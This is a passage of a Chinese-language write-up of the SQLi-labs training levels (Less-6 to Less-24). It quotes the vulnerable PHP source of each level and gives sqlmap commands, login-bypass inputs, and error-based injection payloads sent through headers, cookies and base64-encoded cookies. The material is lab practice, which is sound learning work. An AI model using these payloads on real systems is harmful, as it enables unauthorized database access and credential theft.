title="Less-6"></a>Less-6</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错&amp;盲注</td><td>id=(“$id”)</td></tr></tbody></table><p>仅仅与Less-5的闭合方式不同</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>盲注</td><td>id=((‘$id’))</td></tr></tbody></table><pre class="line-numbers language-源码" data-language="源码"><code class="language-源码"># 使用单引号加双层括号拼接$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;# 支持布尔盲注、延时盲注if true:    输出 You are in.... Use outfile......else:    输出 You have an error in your SQL syntax  &#x2F;&#x2F;print_r(mysql_error());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为将print_r(mysql_erro())注释掉了，所以无法使用报错注入。</p><p>看别人的payload可以使用outfile，之前从来没有听过，真的长见识了。之后再仔细研究一下。</p><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-17">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-17</a></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>盲注</td><td>id=’$id’</td></tr></tbody></table><p>与Less-7一样</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>时间盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"># 使用单引号拼接$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;# 支持延时盲注if true:    输出 You are in............else:    输出 You are in...........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为无论正确与错误输出结果都一样所以只能使用时间盲注。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>时间盲注</td><td>id=”$id”</td></tr></tbody></table><p>除了拼接方式其他都与Less-9相同。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=”$id”</td></tr></tbody></table><p>除了类型变为了POST，注入位置有所变化，注入语句则完全相同</p><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>可以使用hackbar进行注入。</p><p>因为我电脑的hackbar无法发送Post报文的数据部分，所以这里用postman</p><h4 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">sqlmap -u http:&#x2F;&#x2F;11338196-84e7-4162-b1cf-e2819d255a9d.node4.buuoj.cn&#x2F;Less-11&#x2F; -p passwd --skip-static --technique&#x3D;E --random-agent --method&#x3D;post --data&#x3D;&#39;uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit&#39; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>这里还可以使用万能密码进行登录</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-万能密码" data-language="万能密码"><code class="language-万能密码"> # 注释掉 passwd 来登录uname&#x3D;admin&#39;--+&amp;passwd&#x3D;&amp;submit&#x3D;Submituname&#x3D;admin&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit# 注释后面语句 并 添加一个永真条件uname&#x3D;admin&amp;passwd&#x3D;1&#39; or 1--+&amp;submit&#x3D;Submituname&#x3D;admin&amp;passwd&#x3D;1&#39;||1--+&amp;submit&#x3D;Submituname&#x3D;admin&amp;passwd&#x3D;1&#39; or 1#&amp;submit&#x3D;Submituname&#x3D;admin&amp;passwd&#x3D;1&#39;||1#&amp;submit&#x3D;Submit# 闭合后面语句 并 添加一个永真条件uname&#x3D;admin&amp;passwd&#x3D;1&#39;or&#39;1&#39;&#x3D;&#39;1&amp;submit&#x3D;Submituname&#x3D;admin&amp;passwd&#x3D;1&#39;||&#39;1&#39;&#x3D;&#39;1&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=($id)</td></tr></tbody></table><p>仅仅闭合方式不同</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(‘$id’)</td></tr></tbody></table><p>因为没有输出结果，但是有错误结果，所以不能联合查询。</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=”$id”</td></tr></tbody></table><p>仅仅是闭合方式方式不同</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; @$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;$uname and password&#x3D;$passwd LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注</td><td>id=”$id”</td></tr></tbody></table><p>不再报错，所以只能使用盲注</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注</td><td>id=（$id）</td></tr></tbody></table><p>闭合方式不同</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注</td><td>passwd=’$passwd’</td></tr></tbody></table><p>对usname使用了过滤</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function check_input($value)&#123;if(!empty($value))&#123;&#x2F;&#x2F; truncation (see comments)$value &#x3D; substr($value,0,15);&#125;&#x2F;&#x2F; Stripslashes if magic quotes enabledif (get_magic_quotes_gpc())&#x2F;&#x2F; 当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线)&#123;&#x2F;&#x2F;  and 空字符会自动转为含有反斜线的溢出字符。$value &#x3D; stripslashes($value);&#x2F;&#x2F; 去除反斜杠&#125;&#x2F;&#x2F; Quote if not a numberif (!ctype_digit($value))&#x2F;&#x2F; 判断是否是以数字&#123;$value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;&#x2F;&#x2F; 如果不是数字则将字符串转意，用来防止sql注入&#125;else&#123;$value &#x3D; intval($value);&#125;return $value;&#125;$uname&#x3D;check_input($_POST[&#39;uname&#39;]);  $passwd&#x3D;$_POST[&#39;passwd&#39;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D; $uname LIMIT 0,1&quot;;if select 结果正确:    # 更新语句 使用单引号拼接 passwd    $update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;    if mysql 报错:            print_r(mysql_error());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的SQL语句因为username被过滤，所以无法注入。但是下面的update语句中的passwd没有被过滤啊。</p><p>由于可以报错，所以我们可以使用在passwd报错注入，注意username一定要正确。否则连passwdsql语句都执行不到。</p><h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;时间盲注&amp; 布尔盲注</td><td>user-agent = ‘user-agent’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 &#x3D; mysql_query($sql);$row1 &#x3D; mysql_fetch_array($result1);if($row1)&#123;echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与之前的注入有所不同的是，这里的注入是通过http头部进行注入，通过user-agent，REMOTE_ADDR进行注入，但是 REMOTE_ADDR不可伪造。</p><p>因为后面的语句不能随便注释，所以我们需要引号注释。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) and &#39;1&#39; &#x3D; &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;时间盲注&amp; 布尔盲注</td><td>user-agent = ‘referer’</td></tr></tbody></table><p>与上题区别在于referer</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;时间盲注&amp; 布尔盲注</td><td>username=’$cookee’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;&#39;$cookee&#39; LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我们可以通过修改cookie便可以进行注入</p><p>需要注意body中不能有submit</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D; 1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIeadmin&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>那么sqlmap的语句怎么写呢</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-20&#x2F;&quot; --cookie&#x3D;&quot;uname&#x3D;admin*&quot; --batch --dbms&#x3D;MySQL --random-agent  --technique&#x3D;U -v 3 --level&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Advanced-Injection"><a href="#Advanced-Injection" class="headerlink" title="Advanced Injection"></a>Advanced Injection</h2><p>从这里开始变会出现各种方式的过滤，于是开始通读源码，掌握过滤与绕过的方式。</p><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>username=(‘$cookee’)</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F; 如果Cookie[uname]没有值if(!issert(cookie[]))&#123;if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))&#x2F;&#x2F; 都有值&#123;$uname &#x3D; check_input($_POST[&#39;uname&#39;]);&#96;&#x2F;&#x2F; 过滤.$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);$sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 &#x3D; mysql_query($sql);$row1 &#x3D; mysql_fetch_array($result1);if($row1)&#x2F;&#x2F; 查询出结果&#123;setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);&#x2F;&#x2F; 重新设置cookie[uname]print_r(mysql_error());&#x2F;&#x2F; 报错, 所以有使用报错注入的可能性&#125;else｛print_r(mysql_error());｝&#125;&#125;else&#x2F;&#x2F; cookie[uname]不为空&#123;if(!isset($_POST[&#39;submit&#39;]))&#x2F;&#x2F; POST上传的submit为空&#123;$cookee &#x3D; $_COOKIE[&#39;uname&#39;];$cookee &#x3D; base64_decode($cookee);&#x2F;&#x2F; base64解密$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;(&#39;$cookee&#39;) LIMIT 0,1&quot;;&#x2F;&#x2F; sql查询语句$result&#x3D;mysql_query($sql);if (!$result)&#x2F;&#x2F; 没有结果说明语句有问题  &#123;  die(&#39;Issue with your mysql: &#39; . mysql_error());  &#125;$row &#x3D; mysql_fetch_array($result);if($row)&#123;&#x2F;&#x2F; 输出uname与password因此可以用联合查询&#125;&#125;else&#123;&#x2F;&#x2F; 设置cookie[uname]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中可以知道，这个题与上一个题的区别就在于这个题的cookie值需要经过base64加密。</p><pre class="line-numbers language-报文" data-language="报文"><code class="language-报文">POST &#x2F;Less-21&#x2F; HTTP&#x2F;1.1Host: a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cnContent-Length: 17Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.63 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn&#x2F;Less-21&#x2F;Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8Cookie: uname&#x3D;MScpIEFORCAoU0VMRUNUIDEzNDMgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4NzE2YTZhNzE3MSwoU0VMRUNUIE1JRCgoSUZOVUxMKENBU1QoKHRhYmxlX3NjaGVtYSkgQVMgTkNIQVIpLDB4MjApKSwxLDU0KSBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgTElNSVQgMCwxKSwweDcxNmI2MjZhNzEsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlBMVUdJTlMgR1JPVVAgQlkgeClhKS0tIHV3SWVhZG1pbicgQU5EIChTRUxFQ1QgMTM0MyBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHg3MTZhNmE3MTcxLChTRUxFQ1QgTUlEKChJRk5VTEwoQ0FTVCgodGFibGVfc2NoZW1hKSBBUyBOQ0hBUiksMHgyMCkpLDEsNTQpIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyBMSU1JVCAwLDEpLDB4NzE2YjYyNmE3MSxGTE9PUihSQU5EKDApKjIpKXggRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuUExVR0lOUyBHUk9VUCBCWSB4KWEpIC0tIA&#x3D;&#x3D;Connection: closeuname&#x3D;1&amp;passwd&#x3D;1&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;MScpIEFORCAoU0VMRUNUIDEzNDMgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4NzE2YTZhNzE3MSwoU0VMRUNUIE1JRCgoSUZOVUxMKENBU1QoKHRhYmxlX3NjaGVtYSkgQVMgTkNIQVIpLDB4MjApKSwxLDU0KSBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgTElNSVQgMCwxKSwweDcxNmI2MjZhNzEsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlBMVUdJTlMgR1JPVVAgQlkgeClhKS0tIHV3SWVhZG1pbicgQU5EIChTRUxFQ1QgMTM0MyBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHg3MTZhNmE3MTcxLChTRUxFQ1QgTUlEKChJRk5VTEwoQ0FTVCgodGFibGVfc2NoZW1hKSBBUyBOQ0hBUiksMHgyMCkpLDEsNTQpIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyBMSU1JVCAwLDEpLDB4NzE2YjYyNmE3MSxGTE9PUihSQU5EKDApKjIpKXggRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuUExVR0lOUyBHUk9VUCBCWSB4KWEpIC0tIA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn&#x2F;Less-21&#x2F; --technique&#x3D;U --random-agent --cookie&#x3D;&quot;uname&#x3D;*&quot; --tamper&#x3D;&quot;base64encode&quot; --dbms&#x3D;MySQL  --flush-session --technique&#x3D;U -v 3 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>username=”cookie”</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$cookee &#x3D; base64_decode($cookee);$cookee1 &#x3D; &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;echo &quot;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;$cookee1 LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本结构与上一题相同只不是cookie的闭合方式变为了 <strong>“cookie”</strong></p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if(isset($_GET[&#39;id&#39;]))&#123;$id&#x3D;$_GET[&#39;id&#39;];&#x2F;&#x2F;filter the comments out so as to comments should not work$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;&#x2F;&#x2F; 对注释符的过滤$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;$replace &#x3D; &quot;&quot;;$id &#x3D; preg_replace($reg, $replace, $id);$id &#x3D; preg_replace($reg1, $replace, $id);&#x2F;&#x2F;logging the connection parameters to a file for analysis.$fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);&#x2F;&#x2F; connectivity $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于对注释符进行了过滤，所以我们考虑使用简单闭合即可。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) and &#39;1&#39; &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这个题目有些特殊，涉及到了二次注入。再说明二次注入前，我们先看一下源码</p><p>最开始我们看一下每个文件的功能</p><pre class="line-numbers language-文件" data-language="文件"><code class="language-文件">failed.php $_COOKIE[&quot;Auth&quot;]不存在时，报错并退回主页面。forget.php 一个普通html页面index.php 首页，没有后端。login.php 一个普通的页面login_create.php 创建新的用户，我们需要讲一下的文件login.php 登录时使用的后端代码new_user 创建新用户时页面pass_change.php 改变密码时的后端代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="login-create-php"><a href="#login-create-php" class="headerlink" title="login_create.php"></a>login_create.php</h4><p>下面时login_create.php的代码分析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">// 将字符转义</span><span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token comment">// 因为被username转义了所以在sql语句中会被当成一个普通字符串执行</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true or false</span>  <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// mysql_fetch_row() 函数从结果集中取得一行作为数字数组。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 用户已将存在</span><span class="token punctuation">&#123;</span><span class="token comment">// 弹窗报错</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>两次密码相同<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users ( username, password) values(\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span> <span class="token comment">// 这里的\"是为了使""中的"不作为字符串运行</span><span class="token comment">// ,从而使username作为变量执行</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sqllogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 过滤</span>   <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      <span class="token variable">$res</span> <span class="token 